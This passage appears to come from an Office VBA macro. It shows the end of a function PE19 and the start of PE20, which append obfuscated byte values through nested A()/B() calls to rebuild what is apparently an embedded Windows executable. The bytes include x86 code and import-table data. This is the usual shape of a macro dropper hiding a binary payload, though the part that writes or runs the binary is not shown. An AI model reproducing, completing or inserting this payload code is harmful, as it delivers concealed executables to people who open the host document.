    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 229), 0), 255), 21), 134), 192), "@<"), 139), 239), 224), 137), 8), 142), "u"), 211), 239), "u"), 212), 255), "u"), 228), 232), 227), "X"), 255), 255), 11), 196), "0"), 164), "E"), 229), 169), 255), "_p"), 193), "@"), 0), 139), "E"), 236), 139), 8), 139), 9), 137), 164), 34)
    strPE = A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "PQ"), 232), 197), "U"), 0), 0), 3), "YK"), 139), "e"), 232), 255), "u"), 208), 255), 21), 244), "0"), 237), 0), 204), 204), 149), 204), 204), 204), "SW3"), 255), 139), "D$c"), 11), 201), "}uG"), 139), 129), 204), 216), 247), 216), 231), 218), 131)
    strPE = B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(strPE, 216), 0), 137), "D$"), 16), 137), "T$"), 12), 139), "D$"), 19), 11), 192), "}"), 19), 139), "T$"), 20), "C"), 216), 247), 218), 131), 216), "M"), 137), "fW"), 24), 137), "T$"), 20), 11), 192), 160), 27), 139), "L$"), 20), 139), "S$"), 16), "3")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(strPE, 210), 247), 241), 139), "JF]"), 247), 241), 139), 194), "3"), 210), "O"), 184), "N"), 235), 229), 139), 216), 139), "$$"), 20), 139), 137), "$"), 16), 209), "D$"), 12), "y"), 235), 209), 213), 209), 234), 209), 216), 11), 219), "-#"), 247), 241), 139), 200), 247), "d")
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "O"), 24), 145), 247), "d$"), 20), 3), 209), "b"), 228), ";T$+w"), 8), "r"), 14), ";D$"), 12), "v"), 8), "*D$]"), 27), "T$"), 24), 212), "D0"), 199), 27), "T$uOy"), 7), 247), 218), 247), 216), 131), 218)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "b_["), 194), 16), 0), 204), 204), 204), 204), 204), 204), 222), 179), "-"), 204), 204), "+"), 165), 204), 128), 249), 210), "s"), 22), 128), 249), " s"), 244), 15), 228), 208), 17), 255), 195), 139), 194), 193), 250), 31), 128), 225), 31), 211), 248), 195), 193), 250), 31)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 139), 194), 195), 204), 204), 204), 204), 204), ":"), 204), 204), 204), 204), "3"), 204), 204), 204), 232), "Q="), 0), 16), 173), 0), 141), "L$"), 8), "r"), 20), "Q"), 233), 0), 16), 0), 0), "-"), 233), 16), 0), 0), 133), 4), "=2"), 16), 0), 0), "s"), 236)
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "+"), 219), 139), 196), "k"), 1), 214), 225), 139), 8), 139), "@"), 4), "P"), 155), 204), 128), 249), "@s"), 21), 128), 249), " s"), 6), 15), 165), 194), 211), 224), 195), 139), 208), "3"), 192), 128), 225), 31), ";"), 226), "[3"), 192), "3"), 210), 195), 174), "S"), 249)
    strPE = A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(strPE, 133), "D$"), 24), 11), 142), "u"), 24), 139), "L$B"), 140), "D$"), 16), "3"), 210), 247), 241), 139), 216), 174), 197), "$"), 12), "9"), 241), 139), 211), 235), "A"), 139), 200), 139), "\$"), 20), 139), "T$"), 16), 139), "{$"), 12), 209), 233), 18), 176)
    strPE = A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 209), 234), 209), 216), 11), 201), "u"), 192), 247), 24), 139), 240), 247), "d$"), 24), 139), 200), 139), "D$"), 20), 211), 230), 3), 176), "r"), 14), ";"), 2), "$"), 146), "w8r"), 7), ";DU"), 12), "v"), 1), "N3z"), 139), "'^["), 194)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 16), 0), 204), 204), 204), 234), 204), 204), 254), 204), 128), 249), 27), "s"), 21), 128), 249), " s"), 6), 15), 173), 208), 211), 200), 227), 139), 194), 178), "Df"), 141), 31), 211), 10), 195), "3"), 192), "3"), 210), 195), "i"), 255), "%"), 252), 192), 138), 0), "9%")
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 240), 192), "@"), 23), 255), "i"), 228), 193), 190), 0), "h"), 184), 0), 3), 0), "h"), 0), 0), "1"), 0), 232), 144), 0), 0), 0), "YY"), 195), "c"), 192), 195), 195), 255), 0), 204), "$@"), 0), 194), "%"), 132), 193), "7"), 0), 204), 204), 204), 204), 204), 204)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(strPE, 204), 204), "+"), 204), 204), 204), "I%"), 221), 193), "@w"), 0), 0), 0), 0), 0), 0), 233), 0), 0), 0), 0), 240), 0), 0), 0), 0), 0), 0), 0), 0), 15), 159), 0), 0), "Y"), 0), 0), "g"), 0), 0), "^"), 0), 0), 0), 0), 0), 19), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 206), "|"), 225), 0), 223), 218), 0), 166), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 150), 0), 0), 0), 0), 0), 0), 0), 218), 0), 0), 0), "m"), 0), 0), 0), 0), 0), 185), ")"), 0), 0), 0), 0), 230), 0), 0), 0), 0), 0), 193), 187)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 214), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 134), 0), 0), 0), ","), 0), 0), 224), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 218), 5), 0), 0), 0), 0), 0), 5), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(strPE, 0), 0), "S"), 0), 249), 0), "_"), 0), "I"), 0), 0), 0), 141), 0), 190), "#"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 132), 16), 0), 223), 176), 0), 144), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 151), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "3"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 175), 0), 0), "."), 0), "MM"), 0), 0), 0), 0), 0), 5), "\"), 0), 208), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 188), 0), 0), 0), 187), 0), 0), 0), 190), 0), "6"), 0), 0), 0), 0), 235), "j"), 0), 0), 0), 0), "V"), 0), "W"), 0), "s"), 6), 0), "H"), 0), ";"), 0), 0), 0), 155), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(strPE, "B"), 0), 0), 184), 0), 0), 0), 0), 0), 218), 0), 0), 0), 0), 0), "F"), 0), 0), 0), 0), 0), 0), 0), 199), "#"), 0), 0), 0), 0), 7), 0), 0), 0), "$"), 0), 0), 0), 30), 0), 0), 0), "["), 0), "3aG"), 0), 0), 0), 0)
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 234), 158), 0), 0), 0), 0), 0), 0), 254), 0), 219), 0), 218), 157), 0), "9"), 0), 0), "-"), 0), 217), 0), 0), 0), 0), 178), 0), "]"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "C"), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 240), 0), 0), 0), 0), 0), 0), 221), 0), 0), 0), 0), 0), 249), 0), 0), 0), 156), "O"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 169), 0), 0), 0), 168), 0), 0), 0), 0), 0), 0), 187)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 158), 241), 0), 0), 10), "9"), 0), 131), 0), "k"), 0), 0), 237), 0), 0), 0), 0), 0), 0), 0), 0), 0), "U"), 0), "|"), 3), 0), "q"), 0), 5), 0), 0), 0), 0), 184), 159), 0), 0), 202), 0), 248), 192), 0), 0), 242), 0), 0)
    strPE = A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 236), "7"), 0), 0), 0), 0), 0), 0), 0), 0), "="), 147), 215), 0), 0), 0), 232), 0), 254), 0), 0), 0), 0), 34), 0), 0), 0), 0), 174), "m"), 0), 0), 0), 0), 0), 0), 0), 0), 0), "Y"), 0), "T"), 211), 0), "K"), 0), 227)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 0), "K"), 0), 0), 0), 0), 0), 28), 0), 0), 224), 0), 0), 0), 0), 0), 0), 183), 0), 0), 0), 0), 0), 0), 0), 0), 171), 0), 0), 0), 13), 0), "("), 224), 0), 0), 0), 0), 201), 0), 175), 0), 0), 0), 0), 0), 0), ","), 147)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "p"), 0), 202), 0), 0), 0), 0), 0), 0), 0), 0), "}"), 0), 0), 0), 0), 196), 128), 0), 0), 0), 0), 0), 0), 247), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 137), 0), 0), 0), 0), 0), 0), "+")
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "q"), 25), 0), 207), 0), 0), 0), 0), 0), 0), 0), 160), 0), 0), 0), 0), 0), 0), 136), 0), 0), 252), 14), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 254), 214), 0), 0), 0), "0")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 161), 0), 0), 0), 0), 178), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 20), 0), 0), 0), 0), 0), 0), "d"), 223), "I"), 0), "3"), 0), 0), 0), 0), 0), 0), 191), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 203), 0), 0), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "w"), 0), 0), 0), 0), 0), 0), 180), 155), 0), 0), 0), 0), 0), "J"), 0), 0), 0), 0), 16), "S"), 0), 0), 0), 0), "/"), 0), 1)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 175), 217), 0), 0), "3"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 191), 0), 0), 0), 0), "j"), 202), 0), 0), 0), 0), "s"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(strPE, 0), 0), 0), "N"), 0), 0), 0), "n"), 0), 0), 0), 0), 0), 0), 191), 0), 0), 0), 184), 0), 0), 0), 165), 146), 0), 0), 0), 0), 0), 0), 0), 0), 224), 0), 0), 0), 0), 0), 0), 0), 0), 137), "<"), 0), 0), 0), 218), "+"), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), "&"), 25), 0), 133), 0), 0), 0), 16), 0), 0), 0), 143), 0), 158), 0), "p"), 0), 0), 184), 0), "v"), 0), 155), 191), 0), 195), 0), 0), "hc"), 0), 0), 0), 0), 0), 225), 0), 0), 0), 176), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), "a"), 0), 0), 0), 233), 0), 0), 0), 0), 0), 218), 0), 0), 0), 0), 199), 0), 192), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "N"), 0), 186), 0), 0), 0), "0"), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 227), 0), 0), 28), 0), 0), 0), 0), 0), 0), 199), 235), 0), "m"), 0), 0), 0), 0), 206), 0), 0), 0), 0), 0), 0), 0), 192), 155), 0), 213), 0), 0), 226), 0), 0), 0), 0), 0), 0), "9")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 0), 235), 0), 230), 0), 0), 186), 0), "H"), 0), 0), 0), 0), 0), 0), 0), 215), 0), 178), 7), 0), 0), 0), 0), 0), 204), 0), 0), 0), 0), 0), 0), "=^"), 12), 0), 0), 0), 151), 165), 0), 0), 0), 0), 0), "T*"), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 0), "S"), 0), 0), 0), 127), 0), 0), 0), 0), 1), 0), 0), 180), 0), 0), 0), "{"), 0), 0), 186), 0), 0), 0), 0), 28), 0), 203), 0), 0), 159), 0), 0), 0), 0), "a"), 0), 224), 0), 0), 156), 0), 0), 0), 0), 0), "Y"), 0), 0), 0)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 19), 181), 203), 0), 0), 222), 0), 0), 0), 0), "g"), 0), " "), 0), 0), 0), "P^"), 0), 224), 216), 0), 0), 0), 0), 0), 0), "G"), 0), 135), 0), 0), 13), 227), 0), 0), 212), 0), 0), "TM"), 0), 201), 0), "k"), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 150), 0), 0), 0), 0), 0), 0), 0), 202), 0), 25), 0), 245), 158), 0), ":"), 0), 0), 177), 0), 0), "B"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 12), 0), 0), 0), 0), "B"), 0), 0), "{"), 0), 0), 0)
    strPE = A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), "D"), 147), "0"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 3), 0), 0), 191), 0), 0), 0), 227), 0), 213), 0), "$"), 0), 0), 0), 194), 0), 0), 0), 0), 160), 0), 0), "$"), 0), 0), 0), 0), ";"), 243), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 232), 0), 137), 0), 0), 0), 3), 0), 0), 164), 0), 0), 0), 232), 140), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 183), 0), 0), 0), 0), 0), 0), 0), 0), 0), 212), 0), "/"), 191), 0), 0), 0), 0), 224), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 138), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "E"), 0), 0), 0), 0), 0), 241), 0), 0), 0), 0), 0), 0), 0), 145), 0), 0), 0), 145), 0), 137), 0), 0), 0), 0), 0), 0), 0), 0), "m"), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), ","), 175), 0), 0), 177), 0), 0), 0), 0), 0), 206), 0), 2), 0), 0), 0), 0), 0), 0), 0), 0), 0), 135), 0), 0), "z"), 0), 0), 0), "l"), 0), 6), 0), 0), 0), 19), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 0), "Z"), 0), 0), 0), 196), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "e"), 0), 0), 0), 192), "6"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "n"), 224), 0), 3), 0), 177), 0), 0), "-")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 0), 0), 0), "i"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 141), 0), 0), 0), 0), 0), 18), 0), 0), 0), 0), "G"), 0), 0), 0), 0), 0), 0), 0), 0), 31), 0), 0), 0), 0), 0), 0), 0), 0)

    PE19 = strPE
End Function

Private Function PE20() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 232), 0), 0), 0), 0), 0), 0), 219), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), "I"), 0), 13), 0), 0), 0), 0), 0), 0), 0), 135), 0), "."), 0), 0), 0), 0), 0), 27), 16), 246), 0), "+"), 0)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 0), "Tf"), 0), 0), 0), 136), 0), 0), 0), 16), 0), 0), 0), 0), 0), "o"), 0), 0), 0), 0), 175), "V"), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 174), 0), 132), 0), 0), 0), 249), 0), 0), 0), 0), "d"), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(strPE, ">"), 163), 0), 0), 0), "("), 127), 0), "#"), 0), 0), 238), "Q"), 0), 0), 0), 0), 132), 0), 0), 0), 194), 222), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 28), 241), 0), 0), 242), 0), 0), 0), 0), 25), 0), 0), 0), 240), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 0), 0), 140), 207), 0), 0), "p"), 207), 0), 0), 0), 0), 0), 0), "R"), 207), 0), 0), "F"), 207), 0), 0), ":"), 207), 0), 0), "*"), 207), 0), 0), 24), 207), 0), 0), 8), 207), 0), 0), 242), 206), 0), 0), 222), 206), 0), 0), 198), 206), 0), 0)
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 186), 206), 0), 0), 170), 206), 0), 0), 146), 206), 0), 0), "z"), 206), 0), 0), "^"), 206), 0), 0), "N"), 206), 0), 0), "@"), 206), 0), 0), 250), 203), 0), 0), 10), 204), 0), 0), "$"), 204), 0), 0), ">"), 204), 0), 0), "L"), 204), 0), 0), "^"), 204)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "j"), 204), 0), 0), "t"), 204), 0), 0), 134), 204), 0), 0), 154), 204), 0), 0), 178), 204), 0), 0), 192), 204), 0), 0), 218), 204), 0), 0), 242), 204), 0), 0), 12), 205), 0), 0), "&"), 205), 0), 0), ">"), 205), 0), 0), "`"), 205), 0), 0)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "h"), 205), 0), 0), "z"), 205), 0), 0), 138), 205), 0), 0), 160), 205), 0), 0), 176), 205), 0), 0), 192), 205), 0), 0), 210), 205), 0), 0), 224), 205), 0), 0), 238), 205), 0), 0), 4), 206), 0), 0), 22), 206), 0), 0), "4"), 206), 0), 0), 0), 0)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 196), 201), 0), 0), 216), 203), 0), 0), 198), 203), 0), 0), 184), 203), 0), 0), 168), 203), 0), 0), 152), 203), 0), 0), 132), 203), 0), 0), "x"), 203), 0), 0), "h"), 203), 0), 0), "X"), 203), 0), 0), "J"), 203), 0), 0), "B"), 203), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "8"), 203), 0), 0), "*"), 203), 0), 0), 20), 203), 0), 0), 10), 203), 0), 0), 0), 203), 0), 0), 246), 202), 0), 0), 236), 202), 0), 0), 224), 202), 0), 0), 216), 202), 0), 0), 206), 202), 0), 0), 196), 202), 0), 0), 180), 202), 0), 0), 164), 202)
    strPE = A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 154), 202), 0), 0), 146), 202), 0), 0), 136), 202), 0), 0), "~"), 202), 0), 0), "t"), 202), 0), 0), "l"), 202), 0), 0), "d"), 202), 0), 0), "\"), 202), 0), 0), "R"), 202), 0), 0), "H"), 202), 0), 0), ">"), 202), 0), 0), "4"), 202), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(strPE, "*"), 202), 0), 0), " "), 202), 0), 0), 22), 202), 0), 0), 10), 202), 0), 0), 2), 202), 0), 0), 250), 201), 0), 0), 234), 201), 0), 0), 224), 201), 0), 0), 214), 201), 0), 0), 204), 201), 0), 0), 236), 203), 0), 0), 220), 207), 0), 0), 208), 207)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 186), 207), 0), 0), 176), 207), 0), 0), 0), 0), 0), 0), 7), 0), 0), 128), 4), 0), 0), 128), 9), 0), 0), 128), "4"), 0), 0), 128), 14), 0), 0), 128), 12), 0), 0), 128), 21), 0), 0), 128), 23), 0), 0), 128)
    strPE = A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 3), 0), 0), 128), 18), 0), 0), 128), 10), 0), 0), 128), 151), 0), 0), 128), "s"), 0), 0), 128), "t"), 0), 0), 128), "o"), 0), 0), 128), 0), 0), 0), 0), 0), 0), 0), 0), "6"), 128), 193), "J"), 0), 0), 0), 0), 2), 0), 0), 0), "J"), 0)
    strPE = A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), " "), 1), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 224), "?{"), 20), 174), "G"), 225), "z"), 132), "?"), 252), 169), 241), 210), "MbP?"), 0), 0), 0), 0), 0), 0), "P?"), 0), 0), 0), 0)
